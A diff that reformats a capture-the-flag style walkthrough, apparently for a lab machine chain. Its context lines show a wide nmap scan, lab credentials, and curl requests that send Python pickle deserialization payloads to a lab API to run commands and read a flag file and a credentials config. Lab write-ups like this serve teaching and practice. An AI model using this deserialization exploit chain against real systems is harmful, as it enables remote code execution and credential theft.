@@ -90,7 +90,7 @@ nmap -p 22,2049 --open 195.0.0.0/8 --min-rate 2000
 **Proceed to M5 with:** `archivist : Arch1v3@D3S3RT`
 Also note M5's IP for NFS mount in Step 6 of M5.
 
-#OR
+## OR
 
 ```python
 # STEP 1: Generate payload file 
@@ -108,12 +108,15 @@ echo "[*] Payload generated:"
 cat /tmp/payload.txt
 ```
 
+```python
 # STEP 2: Send payload 
 curl -s -X POST http://172.24.4.209:5000/api/signal/process \
   -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
   -H "Content-Type: application/json" \
   -d "{\"payload\":\"$(cat /tmp/payload.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
+```
 
+```python
 # Read flag4.txt
 python3 << 'PYEOF' > /tmp/p_flag.txt
 import pickle, subprocess, base64
@@ -129,7 +132,9 @@ curl -s -X POST http://172.24.4.209:5000/api/signal/process \
   -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
   -H "Content-Type: application/json" \
   -d "{\"payload\":\"$(cat /tmp/p_flag.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
+```
 
+```python
 # Read archive.conf (M5 credentials) 
 python3 << 'PYEOF' > /tmp/p_creds.txt
 import pickle, subprocess, base64
@@ -145,3 +150,4 @@ curl -s -X POST http://172.24.4.209:5000/api/signal/process \
   -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
   -H "Content-Type: application/json" \
   -d "{\"payload\":\"$(cat /tmp/p_creds.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
+```
